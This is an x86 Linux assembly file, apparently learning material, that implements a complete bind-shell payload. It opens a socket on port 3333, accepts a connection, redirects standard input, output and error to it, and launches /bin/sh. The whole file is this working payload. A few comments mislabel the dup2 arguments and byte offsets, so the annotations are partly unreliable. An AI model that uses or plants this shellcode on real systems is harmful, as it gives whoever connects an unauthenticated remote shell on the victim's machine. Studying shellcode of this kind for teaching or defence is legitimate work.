; shellcode.asm 
; Author: Mutti K
; Purpose: Demonstration of simple bindshell 

global _start

section .text

_start:

	; socket()
	mov eax, 0x66 ;socketcall()
	mov ebx, 0x1 ; socket() socketcall() sub call number
    push 0x0 ; Param 3. Reverse order params onto stack
    push 0x1 ; Param 2
    push 0x2 ; Param 1
    mov ecx, esp ; store stack point of socket arguments
	int 0x80
    mov esi, eax ; store newly created socket file descriptor for later use
    
	; bind()
	mov eax, 0x66 ;socketcall()
	mov ebx, 0x2 ; bind() socketcall() sub call number
        ;Create structure on stack for param 2.
    push 0x00000000 ; bytes 16-12, not needed
    push 0x00000000 ; bytes 12-18, not needed
    push 0x00000000 ; bytes 8-4, 0.0.0.0. bind to any ip address
    push WORD 0x050d ; Port number to listen on 3333d d05h. Reverse byte order and in hex, bytes 4-2
    push WORD 0x02 ; AF_INET, bytes 2-0
    mov edi, esp ; store pointer to structure for param 2 of bind()
        ; Reverse order params for bind() onto stack
    push 0x10 ; Param 3 is length of param 2 structure
    push edi ; Param 2 pointer to structure
    push esi ; Param 1, socket file descriptor from socket() call
    mov ecx, esp ; store stack point of socket arguments
	int 0x80

	; listen()
	mov eax, 0x66 ;socketcall()
	mov ebx, 0x4 ; listen() socketcall() sub call number
        ; Reverse order params for bind() onto stack
    push 0x0 ; Param 2
    push esi ; Param 1, socket file descriptor from socket() call
    mov ecx, esp ; store stack point of socket arguments
	int 0x80

	; accept()
	mov eax, 0x66 ;socketcall()
	mov ebx, 0x5 ; accept() socketcall() sub call number
        ; Reverse order params for bind() onto stack
    push 0x0 ; Param 3. addrlen is null
    push 0x0 ; Param 2. addr is null
    push esi ; Param 1, socket file descriptor from socket() call
    mov ecx, esp ; store stack point of socket arguments
	int 0x80
    mov edx, eax ; store new file descriptor for use in dup2 to redirect stdin, out, error

	; dup2()
	mov eax, 0x3f ; dup2()
    mov ecx, 0x0 ; oldfd, stdin
    mov ebx, edx ; newfd, returned fd from accept()
	int 0x80

	; dup2()
	mov eax, 0x3f ; dup2()
    mov ecx, 0x1 ; oldfd, stdout
    mov ebx, edx ; newfd, returned fd from accept()
	int 0x80

	; dup2()
	mov eax, 0x3f ; dup2()
    mov ecx, 0x2 ; oldfd, stderror
    mov ebx, edx ; newfd, returned fd from accept()
	int 0x80

	; execve()
    mov edx, 0x0 ; Param 3, null
    mov ecx, 0x0 ; Param 2, null
    ;create string on stack /bin/sh
    push 0x0068732f ; hs/
    push 0x6e69622f ; nib/
    mov ebx, esp ; Param 1 store pointer to string
	mov eax, 0xb ; execve()
	int 0x80
